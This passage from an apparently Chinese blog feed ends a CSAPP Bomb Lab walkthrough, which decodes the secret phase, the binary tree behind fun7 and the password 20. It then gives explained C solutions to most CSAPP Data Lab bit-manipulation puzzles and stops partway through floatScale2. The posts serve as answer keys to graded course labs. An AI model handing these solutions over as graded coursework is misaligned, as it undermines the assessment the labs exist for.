(strings_not_equal(%rdi, &quot;DrEvil&quot;) &#x3D;&#x3D; 0) &#123;puts(&quot;Curses, you&#39;ve found the secret phase!&quot;);puts(&quot;But finding it and solving it are quite different...&quot;);%eax &#x3D; 0;secret_phase();&#125;&#125;puts(&quot;Congratulations! You&#39;ve defused the bomb!&quot;);&#125;%rax &#x3D; Mem[%rsp + 0x68];if (%rax !&#x3D; Mem[%fs + 0x28]) &#123;__stack_chk_fail();&#125;</code></pre><p>仔细分析上述代码的逻辑，当输入的字符串个数等于 6 时，即解决了 phase_1 ~ phase_6 所有关卡后，程序调用 <code>sscanf</code> 从地址 <code>0x603870</code> 处读取以空格分隔的两个整数和一个字符串，分别存入寄存器 <code>%rdx</code>、<code>%rcx</code> 和 <code>%r8</code> 中，当函数返回值为 3，即成功匹配了 3 个值，且匹配到的第三个值（字符串）等于 \”DrEvil\” 时，即可进入隐藏关卡。</p><p>但是上面我们已经打印了地址 <code>0x603870</code> 处的字符串，为 <code>3 0</code>，只有两个，无法使得匹配数为 3. 我最开始想到的解决方法就是在调试过程中手动更改该地址处的值，但是这样的做法也只具备调试作用，进入隐藏关卡密码仍然无法得到。</p><p>换个角度来思考，这个 <code>3 0</code> 有没有可能不是硬编码的数据，而是我们手动输入的？记得之前 <code>phase_4</code> 的正确密码之一就是 <code>3 0</code>。</p><p>将断点设置在 phase_4 处，并打印 <code>%rdi</code> 寄存器的值， 发现正好就是 <code>0x603870</code>，因此 phase_4 的完整密码应该是 <code>3 0 DrEvil</code> （正如前面所说，前两位也可以是 <code>1 0</code>、<code>7 0</code> 等）。</p><blockquote><p>注意末尾的 DrEvil 在 phase_4 中并不会被读取，因为模式字符串为 “%d %d”，因此匹配成功的值最多为 2，不会影响 <code>cmp  $0x2, %eax</code> 的判断。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-2.png" alt></p><p>经过前面的准备，终于可以着手解决隐藏关卡了，相信有了前面这些关卡的锻炼，隐藏关卡不会显得太难。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401242 &lt;+0&gt;:     push   %rbx0x0000000000401243 &lt;+1&gt;:     call   0x40149e &lt;read_line&gt;0x0000000000401248 &lt;+6&gt;:     mov    $0xa,%edx0x000000000040124d &lt;+11&gt;:    mov    $0x0,%esi0x0000000000401252 &lt;+16&gt;:    mov    %rax,%rdi0x0000000000401255 &lt;+19&gt;:    call   0x400bd0 &lt;strtol@plt&gt;0x000000000040125a &lt;+24&gt;:    mov    %rax,%rbx0x000000000040125d &lt;+27&gt;:    lea    -0x1(%rax),%eax0x0000000000401260 &lt;+30&gt;:    cmp    $0x3e8,%eax0x0000000000401265 &lt;+35&gt;:    jbe    0x40126c &lt;secret_phase+42&gt;0x0000000000401267 &lt;+37&gt;:    call   0x40143a &lt;explode_bomb&gt;0x000000000040126c &lt;+42&gt;:    mov    %ebx,%esi0x000000000040126e &lt;+44&gt;:    mov    $0x6030f0,%edi0x0000000000401273 &lt;+49&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401278 &lt;+54&gt;:    cmp    $0x2,%eax0x000000000040127b &lt;+57&gt;:    je     0x401282 &lt;secret_phase+64&gt;0x000000000040127d &lt;+59&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000401282 &lt;+64&gt;:    mov    $0x402438,%edi0x0000000000401287 &lt;+69&gt;:    call   0x400b10 &lt;puts@plt&gt;0x000000000040128c &lt;+74&gt;:    call   0x4015c4 &lt;phase_defused&gt;0x0000000000401291 &lt;+79&gt;:    pop    %rbx0x0000000000401292 &lt;+80&gt;:    ret</code></pre><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_line();strtol(%rax, 0, 0xa);%rbx &#x3D; %rax;%eax &#x3D; %rax - 1;if (%eax &gt; 0x3e8) &#123;  &#x2F;&#x2F; 无符号比较explode_bomb();&#125;fun7(0x6030f0, %ebx);if (%eax !&#x3D; 2) &#123;explode_bomb();&#125;puts(0x402438);phase_defused();</code></pre><p>可以看到，隐藏关卡的代码逻辑还是比较清晰的：读取一行，应该是隐藏关卡的密码，将其转换为 <code>long</code> 类型，然后又是和之前类似的范围限定语句，随后调用函数 <code>fun7</code>，如果返回值为 2，则密码输入正确。</p><p>问题的关键还是在于函数 <code>fun7</code>，其代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000401204 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000401208 &lt;+4&gt;:     test   %rdi,%rdi0x000000000040120b &lt;+7&gt;:     je     0x401238 &lt;fun7+52&gt;0x000000000040120d &lt;+9&gt;:     mov    (%rdi),%edx0x000000000040120f &lt;+11&gt;:    cmp    %esi,%edx0x0000000000401211 &lt;+13&gt;:    jle    0x401220 &lt;fun7+28&gt;0x0000000000401213 &lt;+15&gt;:    mov    0x8(%rdi),%rdi0x0000000000401217 &lt;+19&gt;:    call   0x401204 &lt;fun7&gt;0x000000000040121c &lt;+24&gt;:    add    %eax,%eax0x000000000040121e &lt;+26&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401220 &lt;+28&gt;:    mov    $0x0,%eax0x0000000000401225 &lt;+33&gt;:    cmp    %esi,%edx0x0000000000401227 &lt;+35&gt;:    je     0x40123d &lt;fun7+57&gt;0x0000000000401229 &lt;+37&gt;:    mov    0x10(%rdi),%rdi0x000000000040122d &lt;+41&gt;:    call   0x401204 &lt;fun7&gt;0x0000000000401232 &lt;+46&gt;:    lea    0x1(%rax,%rax,1),%eax0x0000000000401236 &lt;+50&gt;:    jmp    0x40123d &lt;fun7+57&gt;0x0000000000401238 &lt;+52&gt;:    mov    $0xffffffff,%eax0x000000000040123d &lt;+57&gt;:    add    $0x8,%rsp0x0000000000401241 &lt;+61&gt;:    ret</code></pre><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> x<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> <span class="token operator">*</span>x<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">></span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>z <span class="token operator">==</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token function">fun7</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>又是一个递归函数，不过和 phase_4 不同，这个函数的代码显得很有规律，看到 <code>*(x + 8)</code> 和 <code>*(x + 16)</code> 这样的表达式很容易想到可能又是某种链接结构，不妨打印 <code>0x6030f0</code> 处的内容：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/sp-3.png" alt></p><p>这下结果很明确了，每个结点包含两个链接（指针）域，没错，正是二叉树。为了分析的方便，我根据上图的数据内容绘制了一个等价的二叉树，如下图所示：</p><blockquote><p>可以看到，每个结点由 4 个 8 字节组成，前三个应该分别是值域、左孩子、右孩子，最后一个全为 0 的 8 字节貌似很多余，个人推测应该是 C 语言结构体的 <strong>字节对齐</strong> 导致的。</p></blockquote><p><img src="/2024/09/17/CSAPP-Bomb-Lab/btree.png" alt></p><p>最后再回到函数 fun7 中，要使得最终结果等于 2，一种可能的计算方法如下：</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/formu.png" alt></p><p>我们只需要保证二叉树遍历时依次遍历左孩子、右孩子、左孩子，且输入密码正好等于叶子结点即可，<code>0x14</code> 正好就满足条件，因此隐藏关卡的密码为 20.</p><p>至此，”炸弹“ 成功被”拆除“。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;p&gt;本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏</summary>
      
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Data Lab</title>
    <link href="http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/08/31/CSAPP-Data-Lab/</id>
    <published>2024-08-31T03:45:11.000Z</published>
    <updated>2024-09-01T07:30:08.529Z</updated>
    
    <content type="html"><![CDATA[<p>CSAPP 的第一个 Lab，对应知识点为书中的第 2 章（信息的表示与处理），要求使用受限制的运算符和表达式实现一些位操作。主要分为两个部分：整数部分和浮点数部分。其中整数部分限制较多，比较偏重技巧性，部分题个人认为很有难度。而浮点数部分则比较基础，主要考察对 IEEE 754 标准的熟悉程度，代码较长，但思路相对简单。<br><span id="more"></span></p><h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用德-摩根定律进行推导，推导过程如下：</p><p><img src="/2024/08/31/CSAPP-Data-Lab/formu.png" alt></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 德-摩根定律</span>    <span class="token keyword">return</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>最小整数即最高位（负数权重）为 1，其余（正数权重）为 0。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>由于不能使用左移运算符，因此没办法直接构造出 tmax，需要仔细考虑 tmax 的性质：<code>tmax = 0x7fffffff</code> ，而 <code>tmax + 1 = 0x80000000</code> ，这两个数的二进制位完全互补，因此满足：<code>tmax + tmax + 1 = 0xffffffff</code>，结果全为 1，对该结果取反即可得到 0，取非得到 1。</p><p>但这里还要考虑一个特殊情况：当 <code>x = 0xffffffff</code> 时，<code>x + 1 + x</code> 也满足等于 <code>0xffffffff</code>，因此需要借助异或运算进行特判。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// case = x == 0xffffffff ? 1 : 0;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>case1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>首先构造一个掩码 mask，奇数位全为 1，偶数位全为 0。将 mask 与 x 进行按位与，如果 x 的奇数位全为 1，那么按位与的结果仍然为 mask。然后便可以借助异或和非的组合，将结果转换为 0 或 1。</p><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>            <span class="token comment">// mask = 0x000000aa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x0000aaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x00aaaaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0xaaaaaaaa</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">^</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>补码表示法的重要特性，取反加一即可。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>这里我用了比较笨的逐位判断的方法。首先判断第 4 到第 31 位是否为 0x3，然后只需要关注低 4 位的二进制表示了：若第 3 位为 0，则一定位于指定范围之内，再加上两个特例（1000 和 1001）即可。</p><p>最后将运算符的个数刚好卡在 15 个，勉强过关。</p><h2 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0011 0000 &lt;= x &lt;= 0011 1001</span>    <span class="token keyword">int</span> high <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 4 ~ 31 位是否为 0x3</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// bit3 = 0</span>    <span class="token keyword">int</span> case2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1000</span>    <span class="token keyword">int</span> case3 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1001</span>    <span class="token keyword">return</span> high <span class="token operator">&amp;</span> <span class="token punctuation">(</span>case1 <span class="token operator">|</span> case2 <span class="token operator">|</span> case3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>很容易想到根据 x 的值是否非 0 构造出全 0 或者全 1 的数据 flag，然后将 flag 和 flag 取反后的值分别与 y 和 z 进行按位与，这样必然得到两个数：一个为 y 或 z 本身，另一个为 0，再将结果按位或即可。</p><p>构造的方法比较巧妙，需要注意到全 0 和全 1 分别代表整数 0 和 -1，它们分别是 0 和 1 的相反数，而 0 和 1 我们可以根据表达式是否非 0，使用非运算符构造出来，再将构造的结果取反加一即可。</p><h2 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment">// flag = x ? 0 : -1;</span>    <span class="token keyword">int</span> yp <span class="token operator">=</span> <span class="token operator">~</span>flag <span class="token operator">&amp;</span> y<span class="token punctuation">;</span>       <span class="token comment">// flag = 0, yp = y; flag = -1, yp = 0;</span>    <span class="token keyword">int</span> zp <span class="token operator">=</span> flag <span class="token operator">&amp;</span> z<span class="token punctuation">;</span>        <span class="token comment">// flag = 0, zp = 0; flag = -1, zp = z;</span>    <span class="token keyword">return</span> yp <span class="token operator">|</span> zp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>判断两个数的大小关系，很容易想到使用作差的方法，判断 <code>x + ~y + 1</code> 的结果是否小于等于 0，即全为 0 或者最高位为 1。</p><p>不过这里还需要考虑溢出：由于同号相减必定不会导致溢出，因此我们只需要考虑异号的情况。而如果两个数异号，那它们之间的大小关系就显而易见了。</p><h2 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sign1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign1 = (x &lt; 0 &amp;&amp; y > 0) ? 1 : 0;</span>    <span class="token keyword">int</span> sign2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign2 = (x > 0 &amp;&amp; y &lt; 0) ? 1 : 0;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token operator">~</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                             <span class="token comment">// z = x - y</span>    <span class="token keyword">int</span> sub <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// z &lt;= 0    </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>sub <span class="token operator">|</span> sign1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>sign2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><p>这题从二进制位的角度不好思考，不妨从其表示的十进制数的角度出发：</p><p>当 x = 0 时，<code>-x = x</code> ，即 x 和 -x 的最高位相同，都为 0；当 x != 0 时，x 和 -x 的最高位必定有一个为 1。</p><p>可以利用这一特性将 <code>x | nx</code> 右移 31 位，由于整数进行的是符号右移，因此当最高位为 0 时，右移的结果全为 0，当最高位为 1 时，右移的结果全为 1。再将右移结果加 1，即可构造出 1 或者 0，且刚好与零和非零对应。</p><h2 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">|</span> nx<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h1><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><p>这题看到限制 90 个运算符就给吓着了，实际上也确实很困难，自己想了半天也没有思路，于是在网上参考了别人的解法，感觉相当精妙，在这里介绍一番：</p><p>对于正整数 x 而言，可以使用二分搜索的方式来确定所需的位数。首先判断 x 是否需要 16 位来表示，即 x 右移 16 位是否为 0，如果是，则右移 16 位，否则不做处理，然后再判断是否需要 8 位来处理，以此类推。最后将上述过程中的右移次数累加起来再加一（正整数首位需要为 0），即为总共需要的位数。</p><p>对于负整数 x 而言，它所需的位数与 x 取反得到的整数所需位数相同，证明没整明白。。。</p><h2 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> absx <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> b16<span class="token punctuation">,</span> b8<span class="token punctuation">,</span> b4<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> b0<span class="token punctuation">;</span>    <span class="token comment">// 二分搜索</span>    b16 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b16<span class="token punctuation">;</span>    b8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b8<span class="token punctuation">;</span>    b4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b4<span class="token punctuation">;</span>    b2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b2<span class="token punctuation">;</span>    b1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b1<span class="token punctuation">;</span>    b0 <span class="token operator">=</span> absx<span class="token punctuation">;</span>    <span class="token keyword">return</span> b16 <span class="token operator">+</span> b8 <span class="token operator">+</span> b4 <span class="token operator">+</span> b2 <span class="token operator">+</span> b1 <span class="token operator">+</span> b0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>这题主要是要对规格化数和非规格化数进行分类讨论：</p><p>当 uf 为规格化数，即阶码不为 0 时，乘二相当于将阶码位加 1。</p><p>当 